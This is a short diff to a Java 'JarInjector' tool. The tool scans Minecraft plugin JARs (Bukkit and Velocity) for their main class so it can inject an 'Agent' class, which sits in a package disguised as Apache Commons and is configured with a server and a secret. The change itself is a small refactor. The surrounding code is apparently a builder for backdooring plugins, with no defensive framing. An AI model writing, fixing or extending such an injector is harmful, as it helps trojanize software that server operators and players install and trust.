@@ -36,7 +36,6 @@ public class JarInjector {
 
   private static final String AGENT_PKG = "org/apache/commons/frauded/";
   private static final String AGENT_CLASS = AGENT_PKG + "Agent.class";
-  private static final String AGENT_CORE = AGENT_PKG + "Agent$Core.class";
 
   public JarInjector(File input, File output, String platform, String server, String secret) {
     this.input = input; this.output = output;
@@ -54,12 +53,13 @@ public class JarInjector {
         entries.put(e.getName(), data);
         if (e.getName().endsWith(".class") && !e.getName().startsWith(AGENT_PKG)) {
           String[] info = {null};
+          JarEntry entry = e;
           new ClassReader(data).accept(new ClassVisitor(Opcodes.ASM9) {
             public void visit(int v, int a, String n, String s, String sup, String[] itf) {
               if (("org/bukkit/plugin/java/JavaPlugin".equals(sup)
-                  || "com/velocitypowered/api/plugin/PluginContainer".equals(sup))) info[0] = e.getName();
+                  || "com/velocitypowered/api/plugin/PluginContainer".equals(sup))) info[0] = entry.getName();
               if (itf != null) for (String i : itf)
-                if ("com/velocitypowered/api/plugin/PluginContainer".equals(i)) info[0] = e.getName();
+                if ("com/velocitypowered/api/plugin/PluginContainer".equals(i)) info[0] = entry.getName();
             }
           }, 0);
           if (info[0] != null) { mainPath = info[0]; mainData = data; }
